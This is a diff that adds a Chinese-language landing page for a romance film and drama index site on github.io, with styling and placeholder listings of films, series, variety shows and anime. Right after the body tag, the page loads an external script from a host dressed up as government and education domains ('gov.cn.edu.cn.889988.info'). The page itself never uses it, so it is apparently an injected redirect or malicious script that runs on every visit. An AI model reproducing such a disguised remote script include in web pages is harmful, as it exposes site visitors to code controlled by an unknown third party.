@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱人电影网 - 爱情电影/甜宠剧集/治愈动漫在线看</title>
+<meta name="description" content="爱人电影网提供爱情电影、甜宠剧集、情感综艺、治愈动漫在线观看，温柔治愈、浪漫高分，适合两个人一起看的影视站点。">
+<meta name="keywords" content="爱人电影网,爱情电影,甜宠剧集,情感综艺,治愈动漫,airendianyingwang-h5">
+<style>
+:root{
+  --bg:#fff5f7;
+  --card:#ffffff;
+  --primary:#ff5e87;
+  --primary-dark:#e63e6b;
+  --text:#3a2c2f;
+  --muted:#9a7b82;
+  --line:#ffd6e0;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  line-height:1.7;
+  font-size:16px;
+}
+a{color:var(--primary-dark);text-decoration:none}
+
+/* 顶部 */
+.topbar{
+  position:sticky;top:0;z-index:99;
+  background:rgba(255,255,255,.92);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+.topbar__inner{
+  max-width:1100px;margin:0 auto;
+  padding:.9rem 1rem;
+  display:flex;align-items:center;justify-content:space-between;
+  flex-wrap:wrap;gap:.6rem;
+}
+.brand{
+  font-size:1.35rem;font-weight:800;
+  color:var(--primary-dark);
+}
+.brand small{display:block;font-size:.72rem;color:var(--muted);font-weight:500}
+.menu{display:flex;gap:.5rem;flex-wrap:wrap}
+.menu a{
+  padding:.45rem .8rem;border-radius:999px;
+  background:#ffe9ef;color:var(--primary-dark);
+  font-size:.9rem;
+}
+.menu a:hover{background:var(--primary);color:#fff}
+
+/* Hero */
+.hero{
+  max-width:1100px;margin:0 auto;
+  padding:3.5rem 1rem 2rem;
+  display:grid;grid-template-columns:1.2fr .8fr;gap:2rem;align-items:center;
+}
+.hero h1{font-size:2.3rem;line-height:1.25;margin-bottom:1rem}
+.hero h1 em{color:var(--primary);font-style:normal}
+.hero p{color:var(--muted);margin-bottom:1.6rem}
+.cta{
+  display:inline-block;padding:.75rem 1.8rem;
+  background:var(--primary);color:#fff;border-radius:999px;
+  font-weight:700;
+}
+.hero__art{
+  height:220px;border-radius:24px;
+  background:linear-gradient(135deg,#ff9ab5,#ffd6e0);
+  display:flex;align-items:center;justify-content:center;
+  font-size:5rem;
+}
+
+/* 区块 */
+.block{max-width:1100px;margin:0 auto;padding:2.5rem 1rem}
+.block__title{
+  font-size:1.6rem;margin-bottom:1.4rem;
+  display:flex;align-items:center;gap:.6rem;
+}
+.block__title::before{
+  content:"";width:8px;height:24px;border-radius:4px;background:var(--primary);
+}
+
+/* 爱情电影：左右交错列表 */
+.love-list{display:flex;flex-direction:column;gap:1.1rem}
+.love-row{
+  display:grid;grid-template-columns:96px 1fr;gap:1rem;
+  background:var(--card);border:1px solid var(--line);
+  border-radius:18px;padding:.9rem;align-items:center;
+}
+.love-row__cover{
+  height:96px;border-radius:14px;
+  background:linear-gradient(135deg,#ffb3c6,#ff7d9c);
+  display:flex;align-items:center;justify-content:center;font-size:2.2rem;color:#fff;
+}
+.love-row h3{font-size:1.05rem;margin-bottom:.25rem}
+.love-row span{font-size:.85rem;color:var(--muted)}
+
+/* 剧集：横向卡片 */
+.series-scroll{
+  display:flex;gap:1rem;overflow-x:auto;padding-bottom:.8rem;
+}
+.series-scroll::-webkit-scrollbar{height:6px}
+.series-scroll::-webkit-scrollbar-thumb{background:var(--line);border-radius:6px}
+.series-card{
+  min-width:210px;background:var(--card);
+  border:1px solid var(--line);border-radius:18px;overflow:hidden;flex-shrink:0;
+}
+.series-card__top{
+  height:110px;background:linear-gradient(120deg,#ff8fab,#ffc2d1);
+  display:flex;align-items:center;justify-content:center;font-size:2.6rem;color:#fff;
+}
+.series-card__body{padding:.8rem}
+.series-card__body h3{font-size:.98rem}
+.series-card__body p{font-size:.8rem;color:var(--muted)}
+
+/* 综艺：两列卡片 */
+.show-grid{
+  display:grid;grid-template-columns:repeat(2,1fr);gap:1rem;
+}
+.show-card{
+  background:var(--card);border:1px dashed var(--primary);
+  border-radius:18px;padding:1.1rem;
+}
+.show-card h3{font-size:1rem;margin-bottom:.4rem}
+.show-card p{font-size:.85rem;color:var(--muted)}
+
+/* 动漫：时间线 */
+.anime-time{position:relative;padding-left:1.2rem}
+.anime-time::before{
+  content:"";position:absolute;left:5px;top:0;bottom:0;width:2px;background:var(--line);
+}
+.anime-item{position:relative;margin-bottom:1.1rem;background:var(--card);
+  border:1px solid var(--line);border-radius:16px;padding:.9rem 1rem}
+.anime-item::before{
+  content:"";position:absolute;left:-1.05rem;top:1.1rem;
+  width:12px;height:12px;border-radius:50%;background:var(--primary);
+}
+.anime-item h3{font-size:.98rem}
+.anime-item p{font-size:.84rem;color:var(--muted)}
+
+/* 关于 */
+.about{
+  background:linear-gradient(135deg,#fff0f4,#ffe3ec);
+  border:1px solid var(--line);border-radius:22px;
+  padding:2rem;text-align:center;
+}
+.about h2{color:var(--primary-dark);margin-bottom:.8rem}
+.about p{color:var(--muted);margin-bottom:.6rem}
+.about code{background:#fff;padding:.2rem .5rem;border-radius:8px;color:var(--primary-dark)}
+
+/* 底部 */
+.foot{
+  text-align:center;padding:2rem 1rem;color:var(--muted);
+  font-size:.82rem;border-top:1px solid var(--line);margin-top:2rem;
+}
+
+/* 移动端 */
+@media (max-width:768px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .hero__art{order:-1;height:180px}
+  .menu{justify-content:center}
+  .show-grid{grid-template-columns:1fr}
+  .love-row{grid-template-columns:72px 1fr}
+  .love-row__cover{height:72px;font-size:1.8rem}
+  h1.hero-title{font-size:1.9rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="topbar__inner">
+    <div class="brand">爱人电影网<small>airendianyingwang-h5.github.io</small></div>
+    <nav class="menu">
+      <a href="#">首页</a>
+      <a href="#movie">爱情电影</a>
+      <a href="#series">热播剧集</a>
+      <a href="#show">情感综艺</a>
+      <a href="#anime">治愈动漫</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div>
+    <h1 class="hero-title">和爱人一起看的<br><em>浪漫影视小站</em></h1>
+    <p>爱人电影网｜爱情片、甜宠剧、情感综艺、治愈番，全在这里慢慢看。</p>
+    <a href="#" class="cta">开始观影</a>
+  </div>
+  <div class="hero__art">💕</div>
+</section>
+
+<section class="block" id="movie">
+  <h2 class="block__title">爱情电影</h2>
+  <div class="love-list">
+    <div class="love-row">
+      <div class="love-row__cover">💋</div>
+      <div><h3>初恋限定片单</h3><span>校园 / 青春 / 甜虐</span></div>
+    </div>
+    <div class="love-row">
+      <div class="love-row__cover">🌹</div>
+      <div><h3>都市情感剧场</h3><span>职场 / 暧昧 / 成年人爱情</span></div>
+    </div>
+    <div class="love-row">
+      <div class="love-row__cover">💞</div>
+      <div><h3>异地恋治愈系</h3><span>长途 / 信笺 / 重逢</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="series">
+  <h2 class="block__title">热播剧集</h2>
+  <div class="series-scroll">
+    <div class="series-card">
+      <div class="series-card__top">🛏️</div>
+      <div class="series-card__body"><h3>甜宠合约恋人</h3><p>先婚后爱 / 高甜预警</p></div>
+    </div>
+    <div class="series-card">
+      <div class="series-card__top">☕</div>
+      <div class="series-card__body"><h3>咖啡店暗恋日记</h3><p>日常 / 慢热 / 微醺</p></div>
+    </div>
+    <div class="series-card">
+      <div class="series-card__top">🌙</div>
+      <div class="series-card__body"><h3>深夜来电系列</h3><p>都市 / 情感 / 治愈</p></div>
+    </div>
+    <div class="series-card">
+      <div class="series-card__top">💍</div>
+      <div class="series-card__body"><h3>婚礼倒计时</h3><p>婚恋 / 家庭 / 温情</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="show">
+  <h2 class="block__title">情感综艺</h2>
+  <div class="show-grid">
+    <div class="show-card"><h3>心动信号处理</h3><p>素人交友、约会观察、弹幕陪聊。</p></div>
+    <div class="show-card"><h3>情侣挑战赛</h3><p>默契测试、恋爱任务、甜到掉牙。</p></div>
+    <div class="show-card"><h3>深夜情话局</h3><p>读信、告白、异地恋现场破防。</p></div>
+    <div class="show-card"><h3>结婚前夜谈</h3><p>真实夫妻访谈，情感干货满满。</p></div>
+  </div>
+</section>
+
+<section class="block" id="anime">
+  <h2 class="block__title">治愈动漫</h2>
+  <div class="anime-time">
+    <div class="anime-item"><h3>樱花邮便局</h3><p>春天、情书、转学前的告白。</p></div>
+    <div class="anime-item"><h3>猫与伞下少年</h3><p>雨天、巷口、慢慢靠近的两颗心。</p></div>
+    <div class="anime-item"><h3>星空约会指南</h3><p>天文社、夏祭、牵手看烟花。</p></div>
+    <div class="anime-item"><h3>海边的小步舞</h3><p>疗伤、重逢、海风里的第二次喜欢。</p></div>
+  </div>
+</section>
+
+<section class="block" id="about">
+  <div class="about">
+    <h2>关于爱人电影网</h2>
+    <p>一个专注「爱情 / 甜宠 / 治愈」的影视索引小站。</p>
+    <p>网址：<code>https://airendianyingwang-h5.github.io</code></p>
+    <p>本站仅做影视信息展示与分类导航，内容仅供参考。</p>
+    <a href="#" class="cta">收藏本站</a>
+  </div>
+</section>
+
+<footer class="foot">
+  © 2024 爱人电影网 ｜ airendianyingwang-h5.github.io ｜ 观影愉快 💗
+</footer>
+
+</body>
+</html>
